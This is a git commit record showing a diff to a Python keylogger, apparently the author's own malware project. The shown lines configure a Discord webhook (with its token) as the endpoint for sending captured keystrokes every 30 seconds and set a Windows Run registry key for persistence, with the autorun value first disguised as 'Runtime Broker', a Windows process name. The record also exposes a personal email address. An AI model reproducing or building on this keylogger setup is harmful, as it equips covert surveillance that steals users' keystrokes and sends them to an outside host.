1f83600e4ca884c08fa885f473a517aebf962108
RafalMarczuk <rafmar34@gmail.com>
2023-06-17 16:36:38 +0200

    update

--- keylogger.py
+++ keylogger.py
@@ -8,8 +8,8 @@ import os
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1119333967980679218/Th_zESq80saKWwJzVE8lpT0xjSKSj5LKT-e228uC1-GJYOs4ApaNm8i1syAnaOFSLK4E'
 TIME_INTERVAL = 30  # Amount of time between each report, expressed in seconds.
 KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
-VALUE_NAME = "Runtime Broker"
-VALUE_DATA = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Runtime Broker.exe")
+VALUE_NAME = "test"
+VALUE_DATA = os.path.join(os.path.dirname(os.path.abspath(__file__)), "test.exe")
 
 class Keylogger:
     def __init__(self, webhook_url, interval):
